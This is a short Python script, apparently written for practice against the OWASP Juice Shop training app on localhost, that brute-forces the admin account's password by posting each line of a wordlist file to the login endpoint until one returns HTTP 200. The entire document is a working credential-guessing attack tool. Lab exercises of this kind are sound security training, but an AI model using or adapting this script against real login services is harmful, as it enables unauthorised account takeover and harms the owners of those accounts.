import requests
f = open("copy.txt")
count=0
for x in f:
    count += 1
    url = 'http://localhost:3000/rest/user/login'
    post = requests.post(url, json = {'email':'admin@juice-sh.op', 'password':x.strip()})
    print(str(count) + " | " + x.strip() + " | " + str(post.status_code))
    if post.status_code == 200:
        print("the password has been identified as: " + str(x)) 
        break
f.close() 
